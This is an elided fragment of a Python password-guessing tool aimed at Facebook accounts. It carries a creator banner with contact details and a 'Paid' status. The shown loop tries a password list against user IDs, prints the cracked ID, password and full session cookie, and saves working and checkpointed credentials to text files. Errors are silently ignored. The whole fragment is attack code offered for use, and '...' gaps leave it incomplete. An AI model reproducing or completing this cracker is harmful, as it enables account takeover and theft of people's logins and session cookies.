...
print('\033[1;32m FOLLOW ME ON FACEBOOK ..\033[1;32m')
...
\033[1;34m════════════════════════════════════════════════
        \033[1;36mCREATED BY   :  ASIF SAKHANI 
        \033[1;33mWHATSAPP        :  03417020930
        \033[1;35mSYSTEM       :  DATA & WIFI
        \033[1;32mFACEBOK      :  MR DEVIL 
        \033[1;34mGITHUB       :  NOT AVAILABLE 
        \033[1;36mTOOLS STATUS :  Paid
        \033[1;35mTEAM         :  BMT TEACH
        \033[1;32mVERSION      :  3.1
\033[1;34m════════════════════════════════════════════════\33[1;37m""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ASIF SAKHANI-OK] '+uid+' | '+ps+' \n\033[1;33m COOKIE = \033[1;35m'+coki+  '  ''  \033[0;97m');print(53*'\033[1;37m═')
                open('ASIF SAKHANI-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
                ...
                open('ASIF SAKHANI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;32m[ASIF SAKHANI] %s| [OK:- %s] \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
